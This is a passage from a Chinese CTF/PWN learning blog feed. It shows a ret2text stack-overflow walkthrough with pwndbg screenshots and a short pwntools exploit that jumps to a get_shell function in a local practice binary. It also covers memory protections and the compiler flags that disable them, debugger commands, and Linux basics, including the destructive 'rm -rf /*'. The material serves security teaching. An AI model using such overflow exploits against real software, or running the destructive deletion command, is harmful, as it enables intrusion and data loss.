title="pwndbg"></a>pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调试三连</span></span><br><span class="line">gdb ter2text</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202154009111.png" alt="image-20221202154009111"></p><p><strong>[ REGISTERS ]说明</strong></p><p>我们可以看到这里 EBP 和 ESP 的地址都很高，这也说明栈存放在内存的高地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  0xffffd168 ◂— 0x0</span><br><span class="line">ESP  0xffffd160 —▸ 0xffffd180 ◂— 0x1</span><br></pre></td></tr></table></figure><p><strong>[ DISASM ]说明</strong></p><p>这里只是显示了main函数中的前几行汇编代码</p><p><strong>[ STACK ]说明</strong></p><p>GDB中以低地址到高地址显示，与实际相反</p><h6 id=""><a href="#" class="headerlink" title="#"></a>#</h6><p>没有发现在IDA里面有价值的vulnerable( )，用 n 不断向下执行，直到指向vulnerable( )地址</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202161428044.png" alt="image-20221202161428044"></p><p>接着用 s 步入函数内部，我们可以发现从main变成了vulnerable，说明步入函数体成功</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202161556272.png" alt="image-20221202161556272"></p><p>接着我们用 n 继续运行，提示我们要输入数据，我们这里输入不超过12个字节的数据<strong>（ida里面显示vulnerable函数定义了数组为char s[12]）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>再用stack 20 查看栈具体情况，可以看到数据已经填充了进去。此时ebp的地址为0xffffd158，里面存放原先ebp的地址0xffffd168，ebp的下一条地址是0xffffd15c 里面存放着返回主函数的地址0x80485ae <strong>(main+93)</strong><br><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202162604717.png" alt="image-20221202162604717"></p><p>所以我们只需要将白色部分区域覆盖，即填充数据到ebp的长度为（0x18 - 0x8 = 16字节）；<br>再将ebp中的值0x80485ae <strong>(main+93)</strong>（即粉红框）也覆盖掉（4个字节）；<br>再加上我们的back_door函数地址，就可以获得shell</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202165837052.png" alt="image-20221202165837052"></p><p>那么我们要返回的后门地址是什么呢？ida查看有个get_shell函数，点击打开，再鼠标右键copy to assembly</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202171159198.png" alt="image-20221202171159198"></p><p>得到返回地址0x8048522</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202171351903.png" alt="image-20221202171351903"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>保护机制和编译</title>
      <link href="/2022/12/02/1-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E7%BC%96%E8%AF%91/"/>
      <url>/2022/12/02/1-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="内存保护机制"><a href="#内存保护机制" class="headerlink" title="内存保护机制"></a>内存保护机制</h1><h2 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR (Address Space Layout Randomization)"></a>ASLR (Address Space Layout Randomization)</h2><p><strong>随机化栈上的地址</strong></p><p>•/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR</p><p>•/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化</p><p>•/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Ubuntu上输入以下命令，可以发现系统开启了ASLR</span></span><br><span class="line">ROP$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h2 id="PIE-Position-Independent-Executable"><a href="#PIE-Position-Independent-Executable" class="headerlink" title="PIE (Position-Independent Executable)"></a>PIE (Position-Independent Executable)</h2><p><strong>•随机化ELF文件的映射地址（随机化bss、data、text段地址）</strong></p><p><strong>•开启 ASLR 之后，PIE 才会生效</strong></p><h2 id="The-NX-bits-the-No-eXecute-bits"><a href="#The-NX-bits-the-No-eXecute-bits" class="headerlink" title="The NX bits (the No-eXecute bits)"></a>The NX bits (the No-eXecute bits)</h2><p>•通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃</p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>•在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的</p><p>•canary<strong>长度为1字长</strong>，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作</p><h2 id="RELRO-RELocate-Read-Only"><a href="#RELRO-RELocate-Read-Only" class="headerlink" title="RELRO (RELocate Read-Only)"></a>RELRO (RELocate Read-Only)</h2><p>•部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</p><p>•完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址</p><h1 id="编译pwn题"><a href="#编译pwn题" class="headerlink" title="编译pwn题"></a>编译pwn题</h1><p>gcc的编译关于程序保护开启的选项：<a href="http://t.csdn.cn/3nNkP">http://t.csdn.cn/3nNkP</a></p><p>加了<code>-m32</code>参数的二进制就是32位的，而没加这个参数的就是默认的64位的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASLR：<span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">NX：-z execstack / -z noexecstack (关闭 / 开启)</span><br><span class="line">Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</span><br><span class="line">PIE：-no-pie / -pie (关闭 / 开启)</span><br><span class="line">RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</span><br></pre></td></tr></table></figure><p>示例编译Pwn题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例编译32bit：gcc -m32 -fno-stack-protector -z execstack -o pwn1 pwn1.c</span><br><span class="line"></span><br><span class="line">-m32意思是编译为32位的程序</span><br><span class="line">-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例编译64bit：gcc -fno-stack-protector -z execstack -o pwn1 pwn1.c</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwndbg调试</title>
      <link href="/2022/12/02/2-pwndbg/"/>
      <url>/2022/12/02/2-pwndbg/</url>
      
        <content type="html"><![CDATA[<h1 id="pwndbg调试"><a href="#pwndbg调试" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h1><h2 id="1-b-xx"><a href="#1-b-xx" class="headerlink" title="1.b xx"></a>1.b xx</h2><p> 设置断点（b是breakpoint的缩写）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b 函数名        <span class="comment"># 在指定函数的起始处设置断点</span></span><br><span class="line">b *地址  </span><br><span class="line">b 行号</span><br></pre></td></tr></table></figure><h2 id="2-r"><a href="#2-r" class="headerlink" title="2.r"></a>2.r</h2><p> 运行的意思（r是run的缩写），一般用来代码开始运行，或者重新运行（如果调试到一半又想从头开始运行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n（不会进入函数内部）</span><br><span class="line">s（会执行到函数内部）</span><br><span class="line">c</span><br><span class="line">start(无断点时)</span><br></pre></td></tr></table></figure><p><strong>c</strong>：继续执行（c是continue的缩写），当执行r运行到某个断点后，后面想继续执行到下一个断点或者把剩下代码执行完毕，就可以使用c<br><strong>n</strong>：next的意思，执行当前行代码 <strong>(当前行是指源程序里的一行代码，就相当于汇编的多条指令)</strong><br><strong>s</strong>：step的意思，当一行代码里有函数调用，那么执行s会跳入函数里执行，如果没有函数调用，那么效果和n相同。看到有想要控制的函数时，就用s，比如ret2text中的<strong>vulnerable函数</strong>，进入函数内部，再用n运行代码，输入数据调试。</p><h2 id="3-info-xx"><a href="#3-info-xx" class="headerlink" title="3.info xx"></a>3.info xx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info b <span class="comment">#查看断点信息（copy）</span></span><br><span class="line"></span><br><span class="line">info locals<span class="comment">#查看局部变量（copy）</span></span><br><span class="line"></span><br><span class="line">info register<span class="comment">#查看寄存器（register可以简写为r）</span></span><br><span class="line">例如：info r ebp <span class="comment">#r不能去掉</span></span><br><span class="line"></span><br><span class="line">info <span class="built_in">functions</span>  <span class="comment">#查看所有的函数（copy）</span></span><br></pre></td></tr></table></figure><h2 id="4-p-xx"><a href="#4-p-xx" class="headerlink" title="4.p xx"></a>4.p xx</h2><p>  p是print的缩写，打印某个变量的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p system/main <span class="comment">#显示某个函数地址</span></span><br><span class="line"></span><br><span class="line">p <span class="variable">$esp</span> <span class="comment">#显示寄存器，$不能去掉</span></span><br><span class="line"></span><br><span class="line">p 0xff - 0xea <span class="comment">#计算器</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> &amp;VarName <span class="comment">#查看变量地址</span></span><br><span class="line"></span><br><span class="line">p * 0xffffebac <span class="comment">#查看某个地址处的值</span></span><br></pre></td></tr></table></figure><h2 id="5-x"><a href="#5-x" class="headerlink" title="5.x/ "></a>5.<strong>x/<n/f/u> <addr></strong></h2><p>可以使用examine命令（简写是x）来查看内存地址中的值。x命令的语法如下所示：</p><p>n、f、u是可选的参数。</p><p><strong>n</strong> <strong>是一个正整数，表示显示内存的长度。</strong>也就是说从当前地址向后显示几个地址的内容。</p><p><strong>f</strong> <strong>表示显示的格式。</strong>如果地址所指的是字符串，那么格式可以是<strong>s</strong>，如果是指令地址，那么格式可以是i。<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。</p><p><strong>u表示从当前地址往后请求的字节数。</strong>如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10xb &amp;len 从len的首地址开始，显示首地址后面10个地址，以16进制的形式，打印4个字节</span><br></pre></td></tr></table></figure><p>来个具体的例子：想看以地址0x00aa11为开头，后续8个字节的内存里的内容，内容的表示方式为10进制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x/8db 0x00aa11</span><br><span class="line">解释一下：</span><br><span class="line">8：代表看8条地址</span><br><span class="line">b：代表8的单位是单字节(4byte)</span><br><span class="line">d：代表内存的内容用10进制的表现形式给显示出来</span><br></pre></td></tr></table></figure><h2 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">disas addr <span class="comment">#查看addr处前后的反汇编代码</span></span><br><span class="line"></span><br><span class="line">stack 20 <span class="comment">#查看栈内20个值</span></span><br><span class="line"></span><br><span class="line">show args <span class="comment">#查看参数</span></span><br><span class="line"></span><br><span class="line">vmmap <span class="comment">#查看映射状况 peda带有</span></span><br><span class="line"></span><br><span class="line">readelf <span class="comment">#查看elf文件中各个段的起始地址 peda带有</span></span><br><span class="line"></span><br><span class="line">parseheap <span class="comment">#显示堆状况 peda带有</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基本linux操作</title>
      <link href="/2022/12/02/3-Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/12/02/3-Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本linux操作"><a href="#基本linux操作" class="headerlink" title="基本linux操作"></a>基本linux操作</h1><h2 id="基本知识科普"><a href="#基本知识科普" class="headerlink" title="基本知识科普"></a>基本知识科普</h2><p>Ubuntu基于Debian发行版和Gnome桌面环境，而从11.04版起，Ubuntu发行版放弃了Gnome桌面环境，改为Unity。从前人们认为Linux难以安装、难以使用，在Ubuntu出现后这些都成为了历史。</p><p>广义的Debian是指一个致力于创建自由操作系统的合作组织及其作品，由于Debian项目众多内核分支中以Linux宏内核为主，而且Debian开发者 所创建的操作系统中绝大部分基础工具来自于GNU工程 ，因此 “Debian” 常指Debian GNU/Linux。</p><h2 id="su"><a href="#su" class="headerlink" title="su"></a>su</h2><p>su命令不能切换root，提示su: Authentication failure，只要你sudo passwd root过一次之后，下次再su的时候只要输入密码就可以成功登录了。</p><p><img src="https://img-blog.csdn.net/20180504141111862" alt="img"></p><h2 id="apt命令"><a href="#apt命令" class="headerlink" title="apt命令"></a>apt命令</h2><p>apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。<br>apt [options] [command] [package …]<br><em>options：可选，选项包括 -h（帮助），-y（当安装过程提示选择全部为”yes”），-q（不显示安装的过程）等等。</em><br><em>command：要进行的操作。</em><br><em>package：安装的包名。</em></p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查找软件包命令：apt search [package …]</span><br><span class="line">查看软件包命令：apt show [package …]</span><br><span class="line">列出所有已安装的包：apt list --installed</span><br><span class="line">列出所有已安装的包的版本信息：apt list --all-versions</span><br></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安装指定的软件命令：sudo apt install &lt;package_name&gt;</span><br><span class="line">安装多个软件包：sudo apt install &lt;package_1&gt; &lt;package_2&gt; &lt;package_3&gt;</span><br><span class="line">安装指定版本包：sudo apt instal &lt;package_name&gt;=&lt;version_number&gt;</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">升级所有软件包：sudo apt upgrade</span><br><span class="line">更新指定的软件命令：sudo apt update &lt;package_name&gt; #upgrade升级；update更新</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除软件包命令：sudo apt remove &lt;package_name&gt;</span><br></pre></td></tr></table></figure><h2 id="pip命令"><a href="#pip命令" class="headerlink" title="pip命令"></a>pip命令</h2><p>pip 是 Python 包管理工具，该工具提供了对Python 包的查找、下载、安装、卸载的功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看pip版本：pip --version/pip -V</span><br><span class="line">安装python包：pip install &lt;package_name&gt;</span><br><span class="line">安装指定版本的python包：pip install &lt;package_nmae&gt;==&lt;version_number&gt;</span><br><span class="line">升级：pip install upgrade &lt;package_name&gt;</span><br><span class="line">卸载：pip uninstall &lt;package_name&gt;</span><br><span class="line">列出已安装的包：pip list</span><br><span class="line">显示安装包信息：pip show &lt;package_name&gt;</span><br><span class="line">升级pip：pip install -U pip</span><br></pre></td></tr></table></figure><h2 id="压缩文件操作"><a href="#压缩文件操作" class="headerlink" title="压缩文件操作"></a>压缩文件操作</h2><h3 id="打包和压缩"><a href="#打包和压缩" class="headerlink" title="打包和压缩"></a>打包和压缩</h3><p>linux中的打包文件：aa.tar<br>linux中的压缩文件：bb.gz<br>linux中打包并压缩的文件：.tar.gz</p><p>Linux中的打包文件一般是以.tar结尾的，压缩的命令一般是以.gz结尾的。<br>而一般情况下打包和压缩是一起进行的，打包并压缩后的文件的后缀名一般.tar.gz。</p><p>命令：tar -zcvf 打包压缩后的文件名 要打包的文件<br>其中：z：调用gzip压缩命令进行压缩<br>  c：打包文件<br>  v：显示运行过程<br>  f：指定文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例：打包并压缩/usr/tmp 下的所有文件 压缩后的压缩包指定名称为xxx.tar</span><br><span class="line">tar -zcvf ab.tar aa.txt bb.txt </span><br><span class="line">或：tar -zcvf ab.tar  *</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>命令：tar [-zxvf] 压缩文件<br>其中：x：代表解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">示例：将/usr/tmp 下的ab.tar解压到当前目录下</span><br><span class="line">tar -zxvf ab.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例：将/usr/tmp 下的ab.tar解压到根目录/usr下</span><br><span class="line">tar -zxvf ab.tar -C /usr------C代表指定解压的位置</span><br><span class="line">tar -zxvf ab.tar -C /usr/</span><br></pre></td></tr></table></figure><h2 id="目录操作命令"><a href="#目录操作命令" class="headerlink" title="目录操作命令"></a>目录操作命令</h2><h3 id="目录切换-cd"><a href="#目录切换-cd" class="headerlink" title="目录切换 cd"></a>目录切换 cd</h3><p>命令：cd 目录</p><p>cd /        切换到根目录<br>cd /usr        切换到根目录下的usr目录<br>cd ../        切换到上一级目录 或者  cd ..<br>cd ~        切换到home目录<br>cd -        切换到上次访问的目录</p><h3 id="目录查看-ls-al"><a href="#目录查看-ls-al" class="headerlink" title="目录查看 ls [-al]"></a>目录查看 ls [-al]</h3><p>命令：ls [-al]</p><p>ls                查看当前目录下的所有目录和文件<br>ls -a            查看当前目录下的所有目录和文件（包括隐藏的文件）<br>ls -l 或 ll       列表查看当前目录下的所有目录和文件（列表查看，显示更多信息）<br>ls /dir            查看指定目录下的所有目录和文件   如：ls /usr</p><h3 id="目录操作【增，删，改，查】"><a href="#目录操作【增，删，改，查】" class="headerlink" title="目录操作【增，删，改，查】"></a>目录操作【增，删，改，查】</h3><h4 id="创建目录【增】-mkdir"><a href="#创建目录【增】-mkdir" class="headerlink" title="创建目录【增】 mkdir"></a>创建目录【增】 mkdir</h4><p>命令：mkdir 目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir    aaa            在当前目录下创建一个名为aaa的目录</span><br><span class="line">mkdir    /usr/aaa    在指定目录下创建一个名为aaa的目录</span><br></pre></td></tr></table></figure><h4 id="删除目录或文件【删】rm"><a href="#删除目录或文件【删】rm" class="headerlink" title="删除目录或文件【删】rm"></a>删除目录或文件【删】rm</h4><p>命令：rm [-rf] 目录</p><p>删除文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm 文件        删除当前目录下的文件</span><br><span class="line">rm -f 文件    删除当前目录下的文件（不询问）</span><br></pre></td></tr></table></figure><p>删除目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -r aaa    递归删除当前目录下的aaa目录</span><br><span class="line">rm -rf aaa    递归删除当前目录下的aaa目录（不询问）</span><br></pre></td></tr></table></figure><p>全部删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *    将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*    【自杀命令！慎用！慎用！慎用！】将根目录下的所有文件全部删除</span><br></pre></td></tr></table></figure><p>注意：rm不仅可以删除目录，也可以删除其他文件或压缩包，为了方便大家的记忆，无论删除任何目录或文件，都直接使用 <strong>rm -rf 目录/文件/压缩包</strong></p><h4 id="目录修改【改】mv-和-cp"><a href="#目录修改【改】mv-和-cp" class="headerlink" title="目录修改【改】mv 和 cp"></a>目录修改【改】mv 和 cp</h4><h5 id="一、重命名目录"><a href="#一、重命名目录" class="headerlink" title="一、重命名目录"></a>一、重命名目录</h5><p>​    命令：mv 当前目录  新目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：mv aaa bbb    将目录aaa改为bbb</span><br></pre></td></tr></table></figure><p>​    注意：mv的语法不仅可以对目录进行重命名而且也可以对各种文件，压缩包等进行    重命名的操作</p><h5 id="二、剪切目录"><a href="#二、剪切目录" class="headerlink" title="二、剪切目录"></a>二、剪切目录</h5><p>​    命令：mv 目录名称 目录的新位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：将/usr/tmp目录下的aaa目录剪切到 /usr目录下面     mv /usr/tmp/aaa /usr</span><br></pre></td></tr></table></figure><p>​    注意：mv语法不仅可以对目录进行剪切操作，对文件和压缩包等都可执行剪切操作</p><h5 id="三、拷贝目录"><a href="#三、拷贝目录" class="headerlink" title="三、拷贝目录"></a>三、拷贝目录</h5><p>​    命令：cp -r 目录名称 目录拷贝的目标位置   -r代表递归</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：将/usr/tmp目录下的aaa目录复制到 /usr目录下面     cp /usr/tmp/aaa  /usr</span><br></pre></td></tr></table></figure><p>​    注意：cp命令不仅可以拷贝目录还可以拷贝文件，压缩包等，拷贝文件和压缩包时不用写-r递归</p><h4 id="搜索目录【查】find"><a href="#搜索目录【查】find" class="headerlink" title="搜索目录【查】find"></a>搜索目录【查】find</h4><p>命令：find 目录 参数 文件名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：find /usr/tmp -name &#x27;a*&#x27;    查找/usr/tmp目录下的所有以a开头的目录或文件</span><br></pre></td></tr></table></figure><h2 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h2><h3 id="文件操作【增，删，改，查】"><a href="#文件操作【增，删，改，查】" class="headerlink" title="文件操作【增，删，改，查】"></a>文件操作【增，删，改，查】</h3><h4 id="新建文件【增】touch"><a href="#新建文件【增】touch" class="headerlink" title="新建文件【增】touch"></a>新建文件【增】touch</h4><p>命令：touch 文件名<br>示例：在当前目录创建一个名为aa.txt的文件        touch  aa.txt</p><h4 id="删除文件-【删】-rm"><a href="#删除文件-【删】-rm" class="headerlink" title="删除文件 【删】 rm"></a>删除文件 【删】 rm</h4><p>命令：rm -rf 文件名</p><h4 id="修改文件【改】-vi或vim"><a href="#修改文件【改】-vi或vim" class="headerlink" title="修改文件【改】 vi或vim"></a>修改文件【改】 vi或vim</h4><p>【vi编辑器的3种模式】<br>    基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insert mode）和底行模式（last line mode），各模式的功能区分如下：</p><p>1) 命令行模式command mode）<br>      控制屏幕光标的移动，字符、字或行的删除，查找，移动复制某区段及进入Insert mode下，或者到 last line mode。<br>      命令行模式下的常用命令：<br>      【1】控制光标移动：↑，↓，j<br>      【2】删除当前行：dd<br>      【3】查找：/字符<br>      【4】进入编辑模式：i o a<br>      【5】进入底行模式：:</p><p>2) 编辑模式（Insert mode）<br>      只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。<br>      编辑模式下常用命令：<br>      【1】ESC 退出编辑模式到命令行模式；</p><p>3) 底行模式（last line mode）<br>     将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。<br>     底行模式下常用命令：<br>     【1】退出编辑：   :q<br>     【2】强制退出：   :q!<br>     【3】保存并退出：  :wq</p><p>打开文件</p><p>命令：vi 文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：打开当前目录下的aa.txt文件     vi aa.txt 或者 vim aa.txt</span><br></pre></td></tr></table></figure><p>注意：使用vi编辑器打开文件后，并不能编辑，因为此时处于命令模式，点击键盘i/a/o进入编辑模式。</p><p>编辑文件</p><p>使用vi编辑器打开文件后点击按键：i ，a或者o即可进入编辑模式。</p><p>i:在光标所在字符前开始插入<br>a:在光标所在字符后开始插入<br>o:在光标所在行的下面另起一新行插入</p><p>保存或者取消编辑</p><p>保存文件：</p><p>第一步：ESC  进入命令行模式<br>第二步：:     进入底行模式<br>第三步：wq     保存并退出编辑</p><p>取消编辑：</p><p>第一步：ESC  进入命令行模式<br>第二步：:     进入底行模式<br>第三步：q!     撤销本次修改并退出编辑</p><h4 id="文件的查看【查】"><a href="#文件的查看【查】" class="headerlink" title="文件的查看【查】"></a>文件的查看【查】</h4><p>文件的查看命令：cat/more/less/tail</p><p>cat：看最后一屏</p><p>示例：使用cat查看/etc/sudo.conf文件，只能显示最后一屏内容<br>cat sudo.conf</p><p>more：百分比显示</p><p>示例：使用more查看/etc/sudo.conf文件，可以显示百分比，回车可以向下一行，空格可以向下一页，q可以退出查看<br>more sudo.conf</p><p>less：翻页查看</p><p>示例：使用less查看/etc/sudo.conf文件，可以使用键盘上的PgUp和PgDn向上    和向下翻页，q结束查看<br>less sudo.conf</p><p>tail：指定行数或者动态查看</p><p>示例：使用tail -10 查看/etc/sudo.conf文件的后10行，Ctrl+C结束<br>tail -10 sudo.conf</p>]]></content>
      
      
      <categories>
          
